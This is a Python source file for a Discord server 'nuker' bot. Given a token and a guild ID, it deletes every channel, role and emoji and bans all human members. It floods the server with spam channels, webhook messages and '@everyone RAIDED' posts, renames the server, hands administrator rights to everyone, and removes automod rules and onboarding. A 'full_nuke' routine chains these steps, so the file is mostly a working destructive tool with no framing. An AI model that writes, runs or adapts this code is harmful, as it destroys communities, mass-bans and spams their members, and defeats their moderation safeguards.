import discord
from discord.ext import commands
import asyncio
import os
import json
import random
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='?', intents=intents)
PRESET_DIR = "presets"

def ensure_preset_dir():
    if not os.path.exists(PRESET_DIR):
        os.makedirs(PRESET_DIR)

def list_presets():
    ensure_preset_dir()
    return [f for f in os.listdir(PRESET_DIR) if f.endswith(".json")]

def load_preset(filename):
    ensure_preset_dir()
    path = os.path.join(PRESET_DIR, filename)
    with open(path, "r") as f:
        return json.load(f)

def save_preset(name, data):
    ensure_preset_dir()
    path = os.path.join(PRESET_DIR, f"{name}.json")
    with open(path, "w") as f:
        json.dump(data, f, indent=4)

async def delete_all_channels(guild: discord.Guild):
    channels = list(guild.channels)
    total = len(channels)
    count = 0

    while count < total:
        batch_size = min(40, total - count)
        batch = channels[count:count + batch_size]
        tasks = []
        for channel in batch:
            try:
                tasks.append(channel.delete())
            except Exception:
                pass
        await asyncio.gather(*tasks, return_exceptions=True)
        count += len(batch)
        await asyncio.sleep(0.3)
    return {"success": True, "message": f"Deleted {total} channels"}

async def delete_all_voice_channels(guild: discord.Guild):
    channels = guild.voice_channels
    total = len(channels)
    count = 0

    while count < total:
        batch_size = min(40, total - count)
        batch = channels[count:count + batch_size]
        tasks = []
        for channel in batch:
            try:
                tasks.append(channel.delete())
            except Exception:
                pass
        await asyncio.gather(*tasks, return_exceptions=True)
        count += len(batch)
        await asyncio.sleep(0.3)
    return {"success": True, "message": f"Deleted {count} voice channels"}

async def create_spam_channels(guild: discord.Guild, prefix: str = "nuked", amount: int = 50):
    count = 0
    while count < amount:
        batch_size = min(50, amount - count)
        tasks = []
        for i in range(batch_size):
            channel_name = f"{prefix}-{count + 1}"
            tasks.append(guild.create_text_channel(channel_name))
            count += 1
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.3)
    return {"success": True, "message": f"Created {count} channels"}

async def create_spam_voice_channels(guild: discord.Guild, prefix: str = "vc", amount: int = 50):
    count = 0
    while count < amount:
        batch_size = min(40, amount - count)
        tasks = []
        for i in range(batch_size):
            channel_name = f"{prefix}-{count + 1}"
            tasks.append(guild.create_voice_channel(channel_name))
            count += 1
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.4)
    return {"success": True, "message": f"Created {count} voice channels"}

async def delete_all_roles(guild: discord.Guild):
    bot_member = guild.me
    bot_top_role = bot_member.top_role
    roles = [role for role in guild.roles if not role.managed and role != guild.default_role and role.position < bot_top_role.position]
    deleted = 0
    for role in roles:
        try:
            await role.delete()
            deleted += 1
            await asyncio.sleep(0.2)
        except Exception:
            pass
    return {"success": True, "message": f"Deleted {deleted} roles"}

async def create_custom_roles(guild: discord.Guild, prefix: str = "ROLE", amount: int = 50):
    count = 0
    while count < amount:
        batch_size = min(40, amount - count)
        tasks = []
        for i in range(batch_size):
            role_name = f"{prefix}-{count + 1}"
            tasks.append(guild.create_role(name=role_name, permissions=discord.Permissions.none()))
            count += 1
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.3)
    return {"success": True, "message": f"Created {count} roles"}

async def ban_all_members(guild: discord.Guild):
    members = [m for m in guild.members if not m.bot]
    total = len(members)
    count = 0
    while count < total:
        batch_size = min(40, total - count)
        batch = members[count:count + batch_size]
        tasks = []
        for member in batch:
            try:
                tasks.append(member.ban(reason="Nuked"))
                count += 1
            except Exception:
                pass
        await asyncio.gather(*tasks, return_exceptions=True)
        await asyncio.sleep(0.4)
    return {"success": True, "message": f"Banned {count} members"}

async def kick_all_bots(guild: discord.Guild):
    bots = [m for m in guild.members if m.bot]
    total = len(bots)
    count = 0
    for bot_member in bots:
        try:
            await bot_member.kick(reason="Bot kick")
            count += 1
            await asyncio.sleep(0.3)
        except Exception:
            pass
    return {"success": True, "message": f"Kicked {count} bots"}

async def spam_webhooks(guild: discord.Guild, message: str = "@everyone RAIDED"):
    channels = guild.text_channels
    count = 0
    for channel in channels[:50]:
        try:
            webhook = await channel.create_webhook(name="NUKER")
            for _ in range(50):
                await webhook.send(message)
            count += 1
            await asyncio.sleep(0.3)
        except Exception:
            pass
    return {"success": True, "message": f"Spammed webhooks in {count} channels"}

async def change_server_name(guild: discord.Guild, new_name: str = "NUKED"):
    try:
        await guild.edit(name=new_name)
        return {"success": True, "message": f"Server name changed to {new_name}"}
    except Exception as e:
        return {"success": False, "message": str(e)}

async def mark_all_channels_nsfw(guild: discord.Guild):
    channels = guild.text_channels
    count = 0
    for channel in channels:
        try:
            await channel.edit(nsfw=True)
            count += 1
            await asyncio.sleep(0.3)
        except Exception:
            pass
    return {"success": True, "message": f"Marked {count} channels as NSFW"}

async def unmark_all_channels_nsfw(guild: discord.Guild):
    channels = guild.text_channels
    count = 0
    for channel in channels:
        try:
            await channel.edit(nsfw=False)
            count += 1
            await asyncio.sleep(0.3)
        except Exception:
            pass
    return {"success": True, "message": f"Unmarked {count} channels from NSFW"}

async def delete_all_emojis(guild: discord.Guild):
    emojis = list(guild.emojis)
    count = 0
    for emoji in emojis:
        try:
            await emoji.delete()
            count += 1
            await asyncio.sleep(0.3)
        except Exception:
            pass
    return {"success": True, "message": f"Deleted {count} emojis"}

async def admin_all(guild: discord.Guild):
    try:
        admin_role = await guild.create_role(name="ADMIN", permissions=discord.Permissions(administrator=True))
        members = [m for m in guild.members if not m.bot]
        assigned = 0
        for member in members:
            try:
                await member.add_roles(admin_role)
                assigned += 1
                await asyncio.sleep(0.3)
            except Exception:
                pass
        return {"success": True, "message": f"Assigned admin to {assigned} members"}
    except Exception as e:
        return {"success": False, "message": str(e)}

async def spam_messages(guild: discord.Guild, message: str = "@everyone RAIDED", amount: int = 100):
    channels = guild.text_channels
    messages_sent = 0
    while messages_sent < amount and channels:
        channel = random.choice(channels)
        try:
            await channel.send(message)
            messages_sent += 1
            await asyncio.sleep(0.15)
        except Exception:
            pass
    return {"success": True, "message": f"Sent {messages_sent} messages"}

async def disable_community(guild: discord.Guild):
    try:
        if "COMMUNITY" in guild.features:
            await guild.edit(community=False)
            return {"success": True, "message": "Community disabled"}
        return {"success": True, "message": "Community already disabled"}
    except Exception as e:
        return {"success": False, "message": str(e)}

async def disable_automod(guild: discord.Guild):
    try:
        rules = await guild.fetch_automod_rules()
        count = 0
        for rule in rules:
            try:
                await rule.delete()
                count += 1
                await asyncio.sleep(0.3)
            except Exception:
                pass
        return {"success": True, "message": f"Deleted {count} automod rules"}
    except Exception as e:
        return {"success": False, "message": str(e)}

async def disable_onboarding(guild: discord.Guild):
    try:
        onboarding = await guild.fetch_onboarding()
        if onboarding.enabled:
            await guild.edit_onboarding(prompts=onboarding.prompts, default_channel_ids=onboarding.default_channel_ids, enabled=False)
            return {"success": True, "message": "Onboarding disabled"}
        return {"success": True, "message": "Onboarding already disabled"}
    except Exception as e:
        return {"success": False, "message": str(e)}

async def full_nuke(guild: discord.Guild, config: dict):
    results = []
    
    results.append(await delete_all_channels(guild))
    results.append(await change_server_name(guild, config.get("new_name", "NUKED")))
    results.append(await create_spam_channels(guild, config.get("channel_prefix", "nuked"), config.get("channel_amount", 50)))
    results.append(await spam_messages(guild, config.get("spam_msg", "RAIDED"), config.get("spam_count", 500)))
    results.append(await delete_all_roles(guild))
    results.append(await create_custom_roles(guild, config.get("role_prefix", "ROLE"), config.get("role_amount", 50)))
    results.append(await delete_all_emojis(guild))
    results.append(await disable_automod(guild))
    results.append(await disable_community(guild))
    
    return {"success": True, "message": "Nuke completed", "details": results}

async def preset_nuke(guild: discord.Guild, preset_name: str):
    presets = list_presets()
    if preset_name not in presets:
        return {"success": False, "message": "Preset not found"}
    
    config = load_preset(preset_name)
    return await full_nuke(guild, config)

async def execute_nuke_action(token: str, guild_id: int, action: str, params: dict = None):
    try:
        bot_instance = commands.Bot(command_prefix='!', intents=intents)
        
        @bot_instance.event
        async def on_ready():
            print(f"Bot connected as {bot_instance.user}")
            guild = bot_instance.get_guild(guild_id)
            if not guild:
                await callback({"success": False, "message": "Guild not found"})
                await bot_instance.close()
                return
            
            result = None
            if action == "delete_channels":
                result = await delete_all_channels(guild)
            elif action == "spam_channels":
                prefix = params.get("prefix", "nuked") if params else "nuked"
                amount = params.get("amount", 50) if params else 50
                result = await create_spam_channels(guild, prefix, amount)
            elif action == "delete_roles":
                result = await delete_all_roles(guild)
            elif action == "create_roles":
                prefix = params.get("prefix", "ROLE") if params else "ROLE"
                amount = params.get("amount", 50) if params else 50
                result = await create_custom_roles(guild, prefix, amount)
            elif action == "ban_members":
                result = await ban_all_members(guild)
            elif action == "kick_bots":
                result = await kick_all_bots(guild)
            elif action == "webhook_spam":
                message = params.get("message", "@everyone RAIDED") if params else "@everyone RAIDED"
                result = await spam_webhooks(guild, message)
            elif action == "rename_server":
                new_name = params.get("name", "NUKED") if params else "NUKED"
                result = await change_server_name(guild, new_name)
            elif action == "nsfw_all":
                result = await mark_all_channels_nsfw(guild)
            elif action == "remove_nsfw":
                result = await unmark_all_channels_nsfw(guild)
            elif action == "message_spam":
                message = params.get("message", "@everyone RAIDED") if params else "@everyone RAIDED"
                amount = params.get("amount", 100) if params else 100
                result = await spam_messages(guild, message, amount)
            elif action == "admin_all":
                result = await admin_all(guild)
            elif action == "delete_emojis":
                result = await delete_all_emojis(guild)
            elif action == "delete_voice":
                result = await delete_all_voice_channels(guild)
            elif action == "create_voice":
                prefix = params.get("prefix", "vc") if params else "vc"
                amount = params.get("amount", 50) if params else 50
                result = await create_spam_voice_channels(guild, prefix, amount)
            elif action == "disable_community":
                result = await disable_community(guild)
            elif action == "disable_automod":
                result = await disable_automod(guild)
            elif action == "disable_onboarding":
                result = await disable_onboarding(guild)
            elif action == "full_nuke":
                config = params if params else {}
                result = await full_nuke(guild, config)
            elif action == "preset_nuke":
                preset_name = params.get("preset_name") if params else None
                if preset_name:
                    result = await preset_nuke(guild, preset_name)
                else:
                    result = {"success": False, "message": "Preset name required"}
            
            await callback(result)
            await bot_instance.close()
        
        def callback(result):
            nonlocal final_result
            final_result = result
        
        final_result = None
        try:
            await bot_instance.start(token)
        except Exception as e:
            return {"success": False, "message": str(e)}
        
        return final_result or {"success": False, "message": "No result"}
        
    except Exception as e:
        return {"success": False, "message": str(e)}

def run_nuke_action(token: str, guild_id: int, action: str, params: dict = None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(execute_nuke_action(token, guild_id, action, params))
    finally:
        loop.close()

def list_all_presets():
    return {"success": True, "presets": list_presets()}

def save_preset_file(name: str, data: dict):
    try:
        save_preset(name, data)
        return {"success": True, "message": f"Preset {name} saved"}
    except Exception as e:
        return {"success": False, "message": str(e)}

def get_guilds(token: str):
    async def fetch_guilds():
        bot_instance = commands.Bot(command_prefix='!', intents=intents)
        guilds_data = []
        
        @bot_instance.event
        async def on_ready():
            nonlocal guilds_data
            guilds_data = [{"id": g.id, "name": g.name} for g in bot_instance.guilds]
            await bot_instance.close()
        
        try:
            await bot_instance.start(token)
        except Exception:
            return []
        return guilds_data
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(fetch_guilds())
    finally:
        loop.close()

def execute(token, guild_id, options, settings):
    results = []
    for opt in options:
        if opt == "1":
            result = run_nuke_action(token, int(guild_id), "delete_channels", None)
            results.append(result.get("message", "Deleted channels"))
        elif opt == "2":
            params = {"prefix": settings.get("channel_prefix", "nuked"), "amount": settings.get("channel_amount", 50)}
            result = run_nuke_action(token, int(guild_id), "spam_channels", params)
            results.append(result.get("message", "Spammed channels"))
        elif opt == "3":
            result = run_nuke_action(token, int(guild_id), "delete_roles", None)
            results.append(result.get("message", "Deleted roles"))
        elif opt == "4":
            params = {"prefix": settings.get("role_prefix", "ROLE"), "amount": settings.get("role_amount", 50)}
            result = run_nuke_action(token, int(guild_id), "create_roles", params)
            results.append(result.get("message", "Created roles"))
        elif opt == "5":
            result = run_nuke_action(token, int(guild_id), "ban_members", None)
            results.append(result.get("message", "Banned members"))
        elif opt == "6":
            params = {"message": settings.get("spam_msg", "@everyone RAIDED")}
            result = run_nuke_action(token, int(guild_id), "webhook_spam", params)
            results.append(result.get("message", "Webhook spam"))
        elif opt == "7":
            params = {"name": settings.get("new_name", "NUKED")}
            result = run_nuke_action(token, int(guild_id), "rename_server", params)
            results.append(result.get("message", "Renamed server"))
        elif opt == "8":
            result = run_nuke_action(token, int(guild_id), "nsfw_all", None)
            results.append(result.get("message", "NSFW all"))
        elif opt == "9":
            params = {"message": settings.get("spam_msg", "@everyone RAIDED"), "amount": settings.get("spam_count", 100)}
            result = run_nuke_action(token, int(guild_id), "message_spam", params)
            results.append(result.get("message", "Message spam"))
        elif opt == "10":
            result = run_nuke_action(token, int(guild_id), "admin_all", None)
            results.append(result.get("message", "Admin all"))
        elif opt == "11":
            result = run_nuke_action(token, int(guild_id), "remove_nsfw", None)
            results.append(result.get("message", "Removed NSFW"))
        elif opt == "13":
            result = run_nuke_action(token, int(guild_id), "delete_voice", None)
            results.append(result.get("message", "Deleted voice channels"))
        elif opt == "14":
            params = {"prefix": settings.get("channel_prefix", "vc"), "amount": settings.get("channel_amount", 50)}
            result = run_nuke_action(token, int(guild_id), "create_voice", params)
            results.append(result.get("message", "Created voice channels"))
        elif opt == "15":
            result = run_nuke_action(token, int(guild_id), "delete_emojis", None)
            results.append(result.get("message", "Deleted emojis"))
        elif opt == "16":
            result = run_nuke_action(token, int(guild_id), "kick_bots", None)
            results.append(result.get("message", "Kicked bots"))
        elif opt == "17":
            result = run_nuke_action(token, int(guild_id), "disable_community", None)
            results.append(result.get("message", "Disabled community"))
        elif opt == "18":
            result = run_nuke_action(token, int(guild_id), "disable_automod", None)
            results.append(result.get("message", "Deleted automod"))
        elif opt == "19":
            result = run_nuke_action(token, int(guild_id), "disable_onboarding", None)
            results.append(result.get("message", "Disabled onboarding"))
        elif opt == "full":
            result = run_nuke_action(token, int(guild_id), "full_nuke", settings)
            results.append(result.get("message", "Full nuke"))
    
    return {"success": True, "message": "Nuke operations completed", "details": results}